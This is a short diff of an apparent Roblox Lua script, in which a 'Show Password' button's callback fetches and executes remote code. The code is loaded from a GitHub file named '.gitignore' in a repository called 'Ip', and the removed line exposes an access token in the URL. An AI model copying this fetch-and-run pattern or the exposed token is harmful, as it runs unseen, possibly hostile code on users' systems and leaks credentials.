@@ -32,7 +32,7 @@ Whitelist:AddButton({
 	Name = "Show Password",
 	Callback = function()
 			notif()
-      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Ip/main/.gitignore?token=GHSAT0AAAAAABWACNWVK5X5KHFQUYML3NIGYWVIGPQ'),true))()
+      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Ip/main/.gitignore'),true))()
   	end    
 })
 
